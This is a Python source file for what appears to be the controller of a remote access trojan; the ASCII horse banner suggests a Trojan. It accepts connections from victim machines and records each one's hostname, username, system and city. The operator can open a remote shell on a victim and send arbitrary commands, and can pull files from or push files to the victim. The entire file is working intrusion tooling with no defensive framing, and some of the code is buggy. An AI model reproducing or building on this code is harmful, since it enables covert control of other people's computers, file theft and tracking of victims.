import socket
import threading
import json
import time
import os
from tabulate import tabulate

import sys

class Data:

    Host = "192.168.0.104"
    Port = 6565
    Port_check = 2121
    data_collection = True
    json_data = {}
    client_list = []
    address_list = []
    data_cred = ["IP","Port", "HostName", "UserName", "System", "Location", "NickName", "Status"]
    command_list = ["start", "stop", "connect", "list", "help","?","nick", "history","clear","exit"]
    
    json_help = [
        {"Commands": "connect",
         "Usage": "connect <NickName>",
         "DESCRIPTION": "Connect to Spesific Host",
         "Sub commands": "close\nftp <-d,-u>"
         },
         {"Commands": "list",
         "Usage": "list",
         "DESCRIPTION": "Show all Hosts"
         },
         {"Commands": "nick",
         "Usage": "nick <HostName> <New NickName>",
         "DESCRIPTION": "Assign or Change NickName"
         },
         {"Commands": "history",
         "Usage": "history\nhistory <HostName>",
         "DESCRIPTION": "Show Command History"
         },
         {"Commands": "start",
         "Usage": "start <NickName>",
         "DESCRIPTION": "Start Connection"
         },
         {"Commands": "stop",
         "Usage": "stop <NickName>",
         "DESCRIPTION": "Stop Connection"
         },
         {"Commands": "exit",
         "Usage": "exit",
         "DESCRIPTION": "Stop Server"
         }
    ]
    
    HORSE ="""
    ⠀⠀⠀⠀⠀⠀⢀⠀⠀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠘⣦⡀⠘⣆⠈⠛⠻⣗⠶⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠈⣿⠀⠈⠳⠄⠀⠈⠙⠶⣍⡻⢿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⣰⣿⣧⠀⠀⠀⠀⠀⠀⠀⠈⠻⣮⡹⣿⣿⣷⣦⣄⣀⠀⠀⢀⣸⠃⠀⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⢠⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣮⢿⣿⣿⣿⣿⣿⣿⣿⠟⠀⢰⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⢀⣾⣿⠀⠀⠀⠀⠀⠀⠀⣷⠀⢷⠀⠀⠀⠙⢷⣿⣿⣿⣿⣟⣋⣀⣤⣴⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⢀⣼⢿⣿⡀⠀⠀⢀⣀⣴⣾⡟⠀⠈⣇⠀⠀⠀⠈⢻⡙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⣼⡏⠸⣿⣿⣶⣾⣿⡿⠟⠋⠀⠀⠀⢹⡆⠀⠀⠀⠀⠹⡽⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⣰⣿⠀⠀⠀⣀⡿⠛⠉⠀⠀⢿⠀⠀⠀⠘⣿⡄⠀⠀⠀⠀⠑⢹⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⣿⣿⣷⣶⣾⠏⠀⠀⠀⠀⠀⠘⣇⠀⠀⠀⢻⡇⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⡿⠃⠀⣠⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠈⠙⠿⠿⠋⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⢸⣷⠀⠀⠀⠀⠀⢀⠀⠹⣿⣿⣿⣿⣷⣶⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⢸⣿⠀⠀⠀⠀⢀⡞⠀⠀⠈⠛⠻⠿⠿⠯⠥⠤⢄⣀⣀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⠀⠀⠀⢸⡇⠀⠀⠀⢀⡼⠃⠀⠀⠀⠀⠀⣄⠀⠀⠀⠀⠀⠀⠈⠙⠂⠙⠳⢤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠇⠀⠀⠀⡾⠁⠀⠀⣠⡿⠃⠀⠀⠀⠀⠀⠀⠸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠀⠀⠀⡸⠃⠀⢀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠇⠀⠀⠀⠃⢀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣶⣤⡀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠏⠀⠀⠀⠀⣰⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠙⠻⣿⣿⣿⣿⣿⣿⣦⡀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡏⠀⠀⢀⡖⢰⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠟⠀⠀⠀⢸⣿⠀⠀⠈⢿⣿⣿⣿⣿⣿⡿
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡇⠀⠀⣼⠁⠼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⠀⠀⠀⠀⣼⡇⠀⠀⣠⣾⣿⣿⣿⣿⠟⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠘⣇⠀⠀⢻⡄⢠⡄⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⡴⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⠁⠀⠀⠀⢀⣼⠏⠀⣠⣾⣿⣿⡿⣿⡿⠁⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠁⠀⠘⠂⠀⠀⢳⠀⢳⡀⠀⠀⠀⠀⠀⠀⢀⡼⠁⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣾⣿⠃⠀⠀⠀⠀⣠⣾⠃⣠⣾⣿⣿⠿⠋⢰⡟⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⢠⣿⠃⠀⠀⠀⢀⣀⡴⠞⠙⠲⣷⡄⠀⠀⠀⠀⢠⡾⠁⠀⠀⠀⢀⣀⣠⣤⣶⠿⠟⠋⠀⡾⠀⠀⠀⢀⣴⠟⠁⢠⡟⢱⡿⠃⠀⠀⠸⣇⡀⠀⠀⠀
    ⠀⠀⠀⠀⠀⢀⡴⠟⠁⠀⣀⡤⠖⠋⠁⠀⠀⠀⠀⣸⠇⠀⠀⠀⣤⠟⠑⠋⠉⣿⠋⠉⠉⠉⠁⣠⠞⠀⠀⠀⡇⠀⠀⢠⡿⠋⠀⠀⠈⠁⡿⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀
    ⠀⠀⠀⢀⣾⣏⣤⣶⡾⠛⠉⠀⠀⠀⠀⠀⠀⢀⡼⠃⠀⠀⣠⠞⠁⠀⠀⠀⠀⣿⠀⠀⠀⢀⡼⠃⠀⠀⠀⢸⠇⠀⣰⠟⠀⠀⠀⠀⠀⠐⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⢀⣿⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⢀⣴⠏⠀⠀⣠⠞⠁⠀⠀⠀⠀⠀⠀⣿⠀⠀⢀⡾⠃⠀⠀⠀⢀⡞⠀⣼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⣼⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣶⣶⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⣾⠇⠀⠀⠀⢀⣾⣣⣾⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⢠⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⢠⡟⠀⠀⠀⢀⣾⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⢀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⡄⢀⣀⡀⠀⠀⠀⠀⠀⠀⢸⡇⠀⣾⠇⠀⠀⣰⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⣾⠀⣰⠟⠀⢀⣼⣿⣿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⢸⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠿⠿⠿⠿⠿⠿⠃⠀⠀⠀⢸⣿⣶⠏⢀⣴⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⢸⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⠃⢠⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⢿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⢃⣴⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠈⠛⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣧⣾⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⡟⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⠁⠀⠀⠈⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠿⠿⠿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    """


###################################################################################################
################                          Help                           ##########################
###################################################################################################

def help(command):
    match command:
        case "help":
            header = Data.json_help[0].keys()
            table = f"{tabulate([list(d.values()) for d in Data.json_help], headers=header)}"
            print(table)
        

###################################################################################################
################                       Connections                       ##########################
###################################################################################################


def connections():
    try:
        server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        server.bind((Data.Host,Data.Port))
        server.listen(10)
        client_collector = threading.Thread(target=client_connected,args=(server,))
        client_collector.start()
    except Exception as e:
        print(e)

    try:
        test = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        test.bind((Data.Host,Data.Port_check))
        test.listen(3)
        test_connectiot = threading.Thread(target=test_connect,args=(test,))
        test_connectiot.start()
    except Exception as e:
        print(e)

    try:
        data_collect =threading.Thread(target=data_read)
        data_collect.start()
    except Exception as e:
        print(e)


        

###################################################################################################
################                     Main connection                     ##########################
###################################################################################################

def client_connected(server):
    while 1:
        try:
            sam_client, sam_address = server.accept()
            Data.client_list.append(sam_client)
            Data.address_list.append(sam_address)
            ticket_checker(sam_client,sam_address)
        except Exception as e :
            print(e)


def ticket_checker(client,address):
    HostName = resv(client)
    if data_check("HostName",HostName):
        new_data = {"IP" : address[0], "Port" : address[1]}
        data_update("HostName",HostName, new_data)

        send(client,"hello")
    else :  
        send(client,"whoareyou")
                         
        info = json.loads(resv(client))
        new_data = {
            "IP" : address[0],
            "Port" : address[1],
            "HostName" : HostName,
            "UserName" : info["username"],
            "System": info["system"],
            "Loc": info["country"]+"/"+info["city"],
            "NickName" : HostName,
            "Status" : "True"
        }
        data_update("HostName",'\n\r',new_data)
        

###################################################################################################
################                     Test connection                     ##########################
###################################################################################################


def test_connect(server):
    while True:
        try:
            client, _ = server.accept()
            HostName = resv(client)
            if data_check("HostName",HostName):
                status = data_take("HostName",HostName)["Status"]
                send(client,status)
            else:
                send(client,'-1')  
        
        except Exception as e :
            print(e)

###################################################################################################
################                          Data                           ##########################
###################################################################################################

def data_read():
    while Data.data_collection:
        try:
            with open('./Data/client_list.json') as f:
                Data.json_data = json.load(f)
            time.sleep(1)
        except Exception as e:
            print(e)

def data_check(type,name):
    for each in Data.json_data['client_list']:
        if each[type] == name:
            return True
    return False
        
def data_update(type,name,new_data):
    if name == "\n\r":
        Data.json_data['client_list'].append(new_data)
    else:
        for each in Data.json_data['client_list']:
            if each[type] == name:
                for type in Data.data_cred:
                    if type in new_data:
                        each[type] = new_data[type]
    with open("./Data/client_list.json","w") as f:
        json.dump(Data.json_data,f,indent=4)


def data_take(type,name):
    for each in Data.json_data['client_list']:
        if each[type] == name:
            return each


###################################################################################################
################                         FTP                             ##########################
###################################################################################################


def ftp(command,client):
    tip = command[1]
    file = command[2]

   

    def download(file,client):
        size = resv(client)
        if size == -1:
            return 0
        send(client,"Naber")
        while os.path.exists(f"./Data/ftp/{file}") : 
            file +='(new)'
        chunk = resv(client)
        with open(f"./Data/ftp/{file}",'ab') as f:
            f.write(chunk)

    def upload(file,client):
        try:
            with open(f"./Data/ftp/{file}",'rb') as f:
                send(client,'1')
                resv(client)
                send(client,f.read())

        except Exception as e :
            send(client,'-1')
        
    if tip == "-d":
        download(file,client)
    elif tip == "-u":
       upload(file,client)

###################################################################################################
################                      send/recv                          ##########################
###################################################################################################

def resv(client):
    size = int(client.recv(4096).decode('utf-8'))
    enc = b''
    
    while len(enc) < size:
        enc += client.recv(4096)
    return enc.decode('utf-8')

def send(client,enc):
    size = str(len(enc.encode('utf-8')))
    client.send(size.encode('utf-8'))
    time.sleep(0.3)
    client.send(enc.encode('utf-8'))
    time.sleep(0.3)

###################################################################################################
################                      Commands                           ##########################
###################################################################################################


def connect(NickName):
    if data_check("NickName",NickName):
        user=data_take("NickName",NickName)
        for client in Data.client_list :
            raddr = client.getpeername()[0] if client else None
            rport = client.getpeername()[1] if client else None
            if raddr == user["IP"] and rport == user["Port"]:
                try:
                    print(f"[*] Connected to {NickName} !!")
                    command = ''
                    send(client,"connect")
                    while command != "close":
                        pwd = resv(client)
                        while True:
                            command = input(pwd+" > ").strip().split()
                            if command[0] == "clear" or command[0] == "cls":
                                os.system('cls' if os.name == 'nt' else 'clear')
                            elif command[0] == "ftp":
                                if len(command) != 3 or (command[1] != "-d" or command[1] != "-u"):
                                    print("wrong command")
                                    continue
                                send(client,' '.join(command))
                                ftp(command,client)
                                output = resv(client)
                                print(output,end="")
                                break

                            elif command != "":
                                send(client,' '.join(command))
                                output = resv(client)
                                print(output,end="")
                                break
                except Exception as e :
                    print(e.with_traceback())
                    Data.client_list.remove(client)
                    data_update("NickName",NickName,{"Status":"False"})
                    print(f"[*] {NickName}'s Status Changed as: False\n[*] Client droped !!!")


def lists():
    try:
        data_header = Data.json_data['client_list'][0].keys()
        table = f"{tabulate([list(d.values()) for d in Data.json_data['client_list']], headers=data_header)}"
        print(f"\n{table}\n")
    except Exception as e:
        print("[*] Empty List!!!")
        print(e.with_traceback())


def start(NickName):

    if data_check('NickName',NickName):
        data_update('NickName',NickName,{"Status":"True"})
        print(f"[*] {NickName}'s Status Changed as: True")
    else :
        print("[*] NickName not found.")


def stop(NickName):

    if data_check('NickName',NickName):
        data_update('NickName',NickName,{"Status":"False"})
        print(f"[*] {NickName}'s Status Changed as: False")
        user = data_take("NickName",NickName)
        for client in Data.client_list : 
            raddr = client.getpeername()[0] if client else None
            rport = client.getpeername()[2] if client else None
            if raddr == user["IP"] and rport == user["Port"]:
                print(f"[*] Connection closed: {NickName} !!")
                send(client,"close")
                Data.client_list.remove(client)
    else :
        print("[*] NickName not found.")

def nick(HostName,NickName):
    if data_check('HostName',HostName):
        data_update('HostName',HostName,{"NickName":NickName})
        print(f"[*] {HostName}'s NickName Changed as: {NickName}")
    else :
        print("[*] HostName not found.")

def close():
    for f in Data.client_list:
        send(client,"exit")
    Data.data_collection = False 
    for client in Data.json_data['client_list']:
        client["Status"] = "False"
    with open('./Data/client_list.json', 'w') as f:
        json.dump(Data.json_data, f,indent=4)

        
###################################################################################################



if __name__ == "__main__":

    connections()

    os.system('cls' if os.name == 'nt' else 'clear')
    print(Data.HORSE) #/#/#/#
    while True :
        
        command = input(">").strip().split()
        while command == [] or command[0] not in Data.command_list:
            command = input(">").strip().split()
            

        match command[0]:

            case "connect" :
                connect(command[1])
            
            case "list" :
                lists()
            
            case "nick" :
                nick(command[1],command[2])
                
            case "exit":
                close()
                sys.exit()
            
            case "clear":
                os.system('cls' if os.name == 'nt' else 'clear')

            case "history":
                with open("./Data/history.txt","r") as f:
                    print(f.read())
            
            case "help" : 
                help("help")
                
            case "?":
                help("help")

                
            case "clist":
                print(Data.client_list)
                
            case "start":
                start(command[1])
                
            case "stop":
                stop(command[1])
                
                
            case _ :
                print('[*] Command not Found')
                print('[*] Use help or ? for Help.')



